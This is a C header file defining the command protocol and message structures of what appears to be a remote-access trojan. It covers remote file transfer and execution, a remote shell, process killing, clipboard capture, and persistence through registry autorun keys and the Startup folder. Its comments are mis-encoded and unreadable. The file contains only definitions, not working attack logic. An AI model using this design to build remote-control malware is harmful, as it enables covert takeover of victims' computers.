
#ifndef	__common_h
#define	__common_h

//���ݴ���Ļ�������С
#define CONTEXT_BUF_SIZE   (1024 * 4)
//IP��ַ��������С
#define IPADDR_SIZE  32
//����ҳ��ȡIP��ַ����Ϣ������
#define WEBSITE_BUF_SIZE  512
//��Ļ����Ļ�������С
#define SCREEN_BUF_SIZE  4030
//�����崫�仺������С
#define CLIPBOARD_BUF_SIZE   4078

#define MAX_PATH	260
//---------------------------------------------------
//ָ��ĺ궨��

#define CMD_SHAKEHAND      0x01  //������֤
#define CMD_SYSINFO        0x02  //ϵͳ��Ϣ
#define CMD_DISKINFO       0x03  //������Ϣ
#define CMD_FILELIST       0x04  //�ļ�����Ϣ
#define CMD_DOWNLOAD       0x05  //�ļ�����
#define CMD_UPLOAD         0x06  //�ļ��ϴ�
#define CMD_FILEUPLOAD     0x07  //�ļ������ϴ�
#define CMD_FILEEXEC       0x08  //�ļ�ִ��
#define CMD_REFRESH        0x09  //ˢ��
#define CMD_FOLDER_CREATE  0x10  //����Ŀ¼(�ļ���)
#define CMD_FILE_DEL       0x11  //�ļ����У�ɾ��
#define CMD_FILE_COPY      0x12  //�ļ��ĸ���
#define CMD_FILE_PASTE     0x13  //�ļ���ճ��
#define CMD_FILE_RENAME    0x14  //�ļ�(��)������
#define CMD_ATTRIBUTE      0x15  //����
#define CMD_TELNET         0x16  //����Զ���ն�
#define CMD_COMMOND        0x17  //��������

#define CMD_PROGRESS       0x19  //���̹���
#define CMD_PROC_TASKKILL  0x20  //�رս���

#define CMD_HEARTBEAT	   0x25  //����
#define CMD_CLIPBOARD      0x27  //���а����
#define CMD_FILESETAUTORUN_LOCALMACHINE  0x26 //���ó����ļ���������дע����HKEY_LOCAL_MACHINE
#define CMD_FILESETAUTORUN_CURRENTUSER   0x28 //���ó����ļ���������дע����HKEY_CURRENT_USER
#define CMD_FILECOPYTOSTARTUPFOLDER		 0X29 //��ָ�����򿽱���Startup��ϵͳ����Ŀ¼��

//-----------------------------------------------------

typedef struct tagMSGINFO //������Ϣ�ṹ��
{
	int msg_id;
	u_char context[CONTEXT_BUF_SIZE];
}MSGINFO_S;

typedef struct tagSYSTEMINFO  //����ϵͳ��Ϣ
{
	char szLocalIP[IPADDR_SIZE];  //����IP��ַ
	char hostName[256];   //�������
	int OSVer;  //����ϵͳ�汾
	char szCPUInfo[MAX_PATH]; //cpu��Ϣ
	u_int64_t dwDiskSize;  //Ӳ����Ϣ
}SYSTEMINFO_S;

typedef struct tagDRIVER  //������Ϣ
{
	wchar_t disk;    //������
	double dwTotal;   //���̵Ĵ�С
	double dwFree;    //ʣ��ռ�
	int nType;  //����
}DRIVER_S;

typedef struct tagFILEINFO      //�ļ���Ϣ
{
	wchar_t szFileName[MAX_PATH]; //�ļ���
	int nType;                  //�ļ�����(�ļ�\�ļ���)
	int64_t size;               //�ļ���С
}FILEINFO_S;

typedef struct tagTEMPSTRUCT  //���ļ����ع����е���ʱ�ṹ��
{
	u_int64_t cFileInfo;      //CFileInfo���ָ��
	int l_Socket;      //socket����
	u_char context[MAX_PATH]; //�ļ�·��
}TEMPSTRUCT;

typedef struct tagDOWNFILEDATA   //�ļ��������ݿ�ṹ
{
	u_char context[512];  //�����ݵĴ�С
	u_int32_t size;          //�ļ���С
	u_int32_t nCount;        //���������ڽ���������ʾ
	bool bFlag;         //�ļ��Ƿ������
}DOWNFILEDATA_S;

typedef struct tagFILEEXECINFO  //�ļ�ִ�н����Ϣ
{
	wchar_t szFilePath[MAX_PATH];  //�ļ���
	bool bSuccess;              //ִ�н��
}FILEEXECINFO_S;

typedef struct tagFILEDELSTRUCT  //�ļ����У�ɾ�������̵߳Ľṹ��
{
	u_int64_t cDiskInfo;          //CDisk���ָ��
	int l_Socket;          //socket����
	FILEINFO_S tagFileInfo;  //�ļ����ͽṹ��
}FILEDELSTRUCT_S;

typedef struct tagFILECOPY    //�ļ����ƽ����Ϣ
{
	wchar_t szFilePath[MAX_PATH];  //�ļ�ȫ·��
	wchar_t szFileName[MAX_PATH];  //�ļ���
	bool bTag;                   //�Ƿ������
}FILECOPY_S;

typedef struct tagATTRIBUTE   //����
{
	wchar_t szFilePath[MAX_PATH];  //�ļ����ڵ�Ŀ¼
	wchar_t szFileName[MAX_PATH];  //�ļ���
	int nType;                     //�ļ�(��)����
	struct timeb sysCreateTime;      //����ʱ��
	struct timeb sysModifyTime;      //�޸�ʱ��
	struct timeb sysVisitTime;       //����ʱ��
	bool bArchive;                 //�浵
	bool bReadOnly;                //ֻ��
	bool bHide;                    //����
	bool bSystem;                  //ϵͳ
}ATTRIBUTE_S;

typedef struct tagCMD       //CMD������Ϣ
{
	int flag;            //�ṹ�屣���ֶ�
	char command[1024];  //������
}COMMOND_S;

typedef struct tagPROGRESS  //�����б���Ϣ
{
	wchar_t szProName[MAX_PATH];   //������
	u_int64_t nPid;            //����ID��
	int nThreadCount;    //�߳�����
    int nLevel;          //���̼���
	wchar_t szProPath[MAX_PATH];  //����·��
	int nTag;     //�����������ǲ��ǳɹ���(�����ؼ���)
}PROGRESS_S;

typedef struct tagCLIPBOARD_C  //���������
{
	int nType;  //��������
	bool bTag;  //�������
}CLIPBOARD_C;

typedef struct tagCLIPBOARD_S
{
	int id;
	bool bRead;  //�Ƿ����������
	u_int64_t dwSize;  //���ݴ�С
	u_int32_t Begin;    //�ڼ��η���
	char Data[CLIPBOARD_BUF_SIZE];  //����
}CLIPBOARD_S;

typedef struct tagOnlineInfo
{
	struct in_addr clientAddr;
	int clientPort;
}ONLINEINFO_C;

typedef struct tagFILESETAUTORUNINFO  //���ó���������ִ�н����Ϣ
{
	wchar_t szFilePath[MAX_PATH];  //�ļ���
	bool bSuccess;              //ִ�н��
}FILESETAUTORUNINFO_S;

typedef struct tagFILECOPYTOSTARTUPINFO  //������ϵͳStartupĿ¼ִ�н����Ϣ
{
	wchar_t szFilePath[MAX_PATH];  //�ļ���
	bool bSuccess;              //ִ�н��
}FILECOPYTOSTARTUPINFO_S;
//------------------------------------------

//Ӳ������
enum DISKTYPE
{
	DISK_FIXED,        //�̶�Ӳ��
	DISK_REMOVABLE,    //�ƶ�Ӳ��
	DISK_CDROM         //CD-ROM
};

//�ļ�����
enum FILEATTR
{
	FILE_ATTR,    //�ļ�
	FOLDER_ATTR,   //�ļ���
	FILE_TAG       //��־λ����ʾ�ļ���Ϣ�Ѿ��������
};

//�������ȼ�
enum PROGRESS_LEVEL  
{
	UNKNOWN_LEVEL,    //δ֪
	NORMAL,           //��׼
	IDLE,             //��
	REALTIME,         //ʵʱ
	HIGH,             //��
	ABOVENORMAL,      //���ڱ�׼
	BELOWNORMAL       //���ڱ�׼
};

//�����������
enum CLIPBOARD_TYPE
{
	CLIPBOARD    //������
};

#endif